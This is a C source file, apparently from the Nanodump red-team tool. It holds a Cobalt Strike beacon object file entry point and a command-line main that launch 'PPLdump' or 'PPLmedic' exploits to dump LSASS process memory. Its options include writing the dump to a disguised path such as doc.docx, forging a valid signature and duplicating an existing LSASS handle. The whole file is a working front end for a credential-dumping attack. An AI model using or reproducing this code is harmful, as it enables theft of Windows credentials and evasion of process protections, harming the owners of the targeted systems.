#include "ppl/ppl.h"
#include "ppl/ppl_dump.h"
#include "ppl/ppl_medic.h"

#ifdef BOF

void go(char* args, int length)
{
    datap          parser               = { 0 };
    BOOL           duplicate_handle     = FALSE;
    LPCSTR         dump_path            = NULL;
    BOOL           use_valid_sig        = FALSE;

    BeaconDataParse(&parser, args, length);
    dump_path = BeaconDataExtract(&parser, NULL);
    use_valid_sig = (BOOL)BeaconDataInt(&parser);
    duplicate_handle = (BOOL)BeaconDataInt(&parser);

    run_ppl_dump_exploit(
        dump_path,
        use_valid_sig,
        duplicate_handle);
}

#endif

#ifdef EXE

void usage(char* procname)
{
    PRINT("usage: %s [--ppldump|--pplmedic] --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", procname);
    PRINT("Dumpfile options:");
    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
    PRINT("            filename of the dump");
    PRINT("    --valid, -v");
    PRINT("            create a dump with a valid signature");
    PRINT("Obtain an LSASS handle via:");
    PRINT("    --duplicate, -d");
    PRINT("            duplicate an existing " LSASS " handle");
    PRINT("Help:");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    BOOL   duplicate_handle = FALSE;
    LPCSTR dump_path        = NULL;
    BOOL   use_valid_sig    = FALSE;
    BOOL   use_ppldump      = FALSE;
    BOOL   use_pplmedic     = FALSE;

#ifdef _M_IX86
    if(local_is_wow64())
    {
        PRINT_ERR("Nanodump does not support WoW64");
        return -1;
    }
#endif

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "--ppldump", 10))
        {
            use_ppldump = TRUE;
        }
        else if (!strncmp(argv[i], "--pplmedic", 11))
        {
            use_pplmedic = TRUE;
        }
        else if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            use_valid_sig = TRUE;
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                return 0;
            }
            dump_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-d", 3) ||
                 !strncmp(argv[i], "--duplicate", 12))
        {
            duplicate_handle = TRUE;
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return 0;
        }
    }

    if ( use_ppldump && use_pplmedic )
    {
        PRINT("You can't provide both --ppldump and --pplmedic");
        return 0;
    }

    if ( !use_ppldump && !use_pplmedic )
    {
        PRINT("You must provide either --ppldump or --pplmedic");
        return 0;
    }

    if (!dump_path)
    {
        PRINT("You need to provide the --write parameter");
        return 0;
    }

    if (!is_full_path(dump_path))
    {
        PRINT("You need to provide the full path: %s", dump_path);
        return 0;
    }

    if ( use_ppldump )
    {
        run_ppl_dump_exploit(
            dump_path,
            use_valid_sig,
            duplicate_handle);
    }
    else if ( use_pplmedic )
    {
        run_ppl_medic_exploit(
            dump_path,
            use_valid_sig,
            duplicate_handle);
    }

    return 0;
}

#endif
